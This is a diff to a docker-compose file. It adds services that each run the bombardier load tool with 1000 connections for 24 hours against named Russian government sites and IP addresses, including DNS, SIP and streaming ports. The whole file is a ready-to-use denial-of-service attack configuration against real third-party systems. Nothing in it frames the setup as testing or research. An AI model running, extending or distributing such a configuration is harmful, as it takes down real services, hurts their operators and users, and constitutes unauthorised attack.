@@ -3,3 +3,30 @@ services:
         gov_1:
                 image: alpine/bombardier
                 command: "-c 1000 -t 2s -l -d 24h http://www.fsb.ru"
+        gov_2:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h http://213.24.76.25:1935"
+        gov_3:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h http://213.24.76.25:8080"
+        gov_4:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h http://195.218.193.189:5060"
+        gov_5:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h http://95.173.148.51:5060"
+        gov_6:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h http://95.173.148.51:554"
+        gov_7:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h https://ca.vks.rosguard.gov.ru"
+        gov_8:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h 95.173.148.51:53"
+        gov_9:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h 95.173.148.50:53"
+        gov_10:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h 109.252.233.150:51"
